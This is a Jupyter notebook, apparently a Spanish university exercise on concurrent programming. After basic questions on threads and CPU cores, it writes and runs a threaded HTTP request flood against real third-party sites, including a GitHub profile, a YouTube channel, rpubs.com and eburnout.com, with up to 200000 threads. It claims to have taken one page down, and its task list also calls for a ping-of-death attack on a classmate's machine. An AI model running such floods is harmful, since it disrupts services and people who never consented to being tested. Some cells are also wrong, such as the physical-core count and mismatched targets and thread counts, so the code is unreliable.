{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "6fdecb03-4b33-4092-a5ce-42bb9f9d86f1",
   "metadata": {},
   "source": [
    "<h1 style = \"text-align:center; font-size: 36px\"> Programación Concurrente y Distribuida </h1>\n",
    "<a href=\"https://github.com/adriDiazz\">\n",
    "    <img src=\"fotit.jpeg\" title = \"Adrian Diaz Manzanares 22016494\" alt=\"Adrian Diaz Manzanares 22016494\" width=\"100\" height=\"100\" style=\"float:left ; vertical-align:centre\">\n",
    "    <img src=\"uem.jpg\" title = \"M21\" alt=\"UE\" width=\"105\" height=\"105\" style=\"float:right ;vertical-align:centre\">"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "001f84c8-0ea1-46f1-92db-1a22a9237f35",
   "metadata": {
    "tags": []
   },
   "source": [
    "1. Crear platilla y portada para todos los ejercicios que realicemos a lo largo del curso.\n",
    "2. Determine los tipos de respuesta de la parte cliente\n",
    "3. El número de proceso que maneja y cuantos procesos están activos.\n",
    "4. ¿Cuántos hilos activos tienes en este momento?\n",
    "5. ¿Cuántos cores lógicos tiene tu equipo?\n",
    "6. ¿Cuántos cores físicos tiene tu equipo?\n",
    "7. Enumere e identifique los hilos lanzados.\n",
    "8. Lance un ataque usando 20 hilos a: https://github.com/sukuzhanay\n",
    "9. Lance un ataque usando 200 hilos a: https://www.youtube.com/UCEXbXdeafAjBahYK2hoQJFg\n",
    "10. Lance un ataque usando 2000 hilos a: https://rpubs.com/christian_sucuzhanay\n",
    "11. Lance un ataque usando 200000 hilos a: https://rpubs.com/christian_sucuzhanay\n",
    "14. Lance un ataque usando 400 hilos a: https://eburnout.com/\n",
    "15. ¿Que páginas logro \"tumbar\"?\n",
    "16. Lance 20 hilos con el ping de la muerte al equipo de su compañero (a elegir)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "70a96926-eb9c-42a6-bc2c-2b3fdf7aa7c4",
   "metadata": {},
   "outputs": [],
   "source": [
    "import os,platform,urllib3,requests,threading"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "fa420e49-d2dd-408d-816d-8faef91743ba",
   "metadata": {},
   "outputs": [],
   "source": [
    "from IPython.display import Image"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "cdd69dc9-8bdc-4de8-a996-7113c7f67984",
   "metadata": {},
   "outputs": [],
   "source": [
    "Image(filename='atack.png')"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "ebd44c3e-2f41-4d1e-a3b9-e6a5511df912",
   "metadata": {},
   "source": [
    "4. ¿Cuántos hilos activos tienes en este momento?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "0ae08a4e-b52d-46e7-9f47-68f93a4069c1",
   "metadata": {},
   "outputs": [],
   "source": [
    "threading.enumerate()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "cebf9414-3897-40c2-9453-c385a7afdaef",
   "metadata": {},
   "source": [
    "5.¿Cuántos cores lógicos tiene tu equipo?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 12,
   "id": "d322775d-d808-406c-8798-c2eafac995f2",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Mi equipo tiene 8 nucleos logicos\n"
     ]
    }
   ],
   "source": [
    "print(\"Mi equipo tiene \" + str(os.cpu_count()) + \" nucleos logicos\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a6e8fc6d-f58c-41b1-a653-ae18d7f5de03",
   "metadata": {},
   "source": [
    "6. ¿Cuántos cores físicos tiene tu equipo?"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "id": "502a4443-748d-4935-acc1-76369b800019",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Mi equipo tiene 4.0 fisicos\n"
     ]
    }
   ],
   "source": [
    "print(\"Mi equipo tiene \" + str(os.cpu_count()/2) + \" fisicos\")"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "4af870e3-d84f-4042-b445-848b003555d9",
   "metadata": {},
   "source": [
    "7. Enumere e identifique los hilos lanzados."
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "id": "baeaad8d-b265-4290-976f-67a0f7a54317",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "[<_MainThread(MainThread, started 8960)>,\n",
       " <Thread(Thread-4, started daemon 9128)>,\n",
       " <Heartbeat(Thread-5, started daemon 3568)>,\n",
       " <HistorySavingThread(IPythonHistorySavingThread, started 11972)>,\n",
       " <ParentPollerWindows(Thread-3, started daemon 5664)>]"
      ]
     },
     "execution_count": 15,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "threading.enumerate()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "825f4d70-956a-4aa4-9af0-57f8f0801ea6",
   "metadata": {},
   "source": [
    "8. Lance un ataque usando 20 hilos a: https://github.com/sukuzhanay"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "id": "c1511817-ed80-441c-8097-4e0b2dbc8eda",
   "metadata": {},
   "outputs": [],
   "source": [
    "def throw():\n",
    "    url=requests.get(\"https://github.com/sukuzhanay\")\n",
    "    print(url)\n",
    "   \n",
    "        "
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 10,
   "id": "767d7236-64c2-4a11-8774-d39f2fa6429a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "<Response [200]><Response [200]>\n",
      "<Response [200]>\n",
      "\n",
      "<Response [200]>\n",
      "<Response [200]>\n",
      "<Response [200]>\n",
      "<Response [200]>\n",
      "<Response [200]>\n",
      "<Response [200]>\n",
      "<Response [200]><Response [200]>\n",
      "\n",
      "<Response [200]><Response [200]>\n",
      "\n",
      "<Response [200]><Response [200]>\n",
      "<Response [200]>\n",
      "\n",
      "<Response [200]>\n",
      "<Response [200]><Response [200]>\n",
      "\n",
      "<Response [200]>\n"
     ]
    }
   ],
   "source": [
    "for i in range(20):\n",
    "    threading.Thread(target=throw).start()\n",
    "    "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "624add03-15d8-44e9-98fa-667279eeb5ac",
   "metadata": {},
   "source": [
    "9. Lance un ataque usando 200 hilos a: https://www.youtube.com/UCEXbXdeafAjBahYK2hoQJFg"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 55,
   "id": "072827f8-9bf6-43ef-9eff-b89d9fa9259a",
   "metadata": {},
   "outputs": [],
   "source": [
    "def throw():\n",
    "    url=requests.get(\"https://www.youtube.com/UCEXbXdeafAjBahYK2hoQJFgy\")\n",
    "    print(url)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "a1f319aa-a789-4edd-9c63-fe60fe0af56d",
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(200):\n",
    "    threading.Thread(target=throw).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "74fe9209-fe2c-4398-8144-be38b7ad3ba5",
   "metadata": {},
   "source": [
    "10. Lance un ataque usando 2000 hilos a: https://rpubs.com/christian_sucuzhanay"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "id": "9a8bd20b-b682-4e0b-ba59-fa565e8c2ac3",
   "metadata": {},
   "outputs": [],
   "source": [
    "def throw():\n",
    "    url=requests.get(\"https://rpubs.com/christian_sucuzhanay\")\n",
    "    print(url)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "495fbada-ce58-476d-b9fe-663f3dc9594c",
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(200):\n",
    "    threading.Thread(target=throw).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7746bd2c-41ec-4d79-8837-b97c74745f3f",
   "metadata": {},
   "source": [
    "11. Lance un ataque usando 200000 hilos a: https://rpubs.com/christian_sucuzhanay"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 17,
   "id": "77c22f31-933a-41e1-9248-091f46152363",
   "metadata": {},
   "outputs": [],
   "source": [
    "def throw():\n",
    "    url=requests.get(\"https://rpubs.com/christian_sucuzhanay\")\n",
    "    print(url)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "72d8b98f-4754-4717-9479-05531c04df10",
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(200000):\n",
    "    threading.Thread(target=throw).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "b9633cfe-a20d-427f-b8d3-88c9573ada8f",
   "metadata": {},
   "source": [
    "14. Lance un ataque usando 400 hilos a: https://eburnout.com/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 63,
   "id": "da28054c-6c3f-4bb3-93f0-251b217679a5",
   "metadata": {},
   "outputs": [],
   "source": [
    "def throw():\n",
    "    url=requests.get(\"https://rpubs.com/christian_sucuzhanay\")\n",
    "    print(url)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "470515f7-f041-4f50-8caa-006ad5b20805",
   "metadata": {},
   "outputs": [],
   "source": [
    "for i in range(400):\n",
    "    threading.Thread(target=throw).start()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "886e9c5b-8b49-4085-837c-d63c5c2fe529",
   "metadata": {},
   "source": [
    "15. ¿Que páginas logro \"tumbar\"?"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "5173161c-2033-4b50-88c4-d6b3e049658e",
   "metadata": {},
   "source": [
    "Solo se logro tumbar https://rpubs.com/christian_sucuzhanay"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.8.8"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
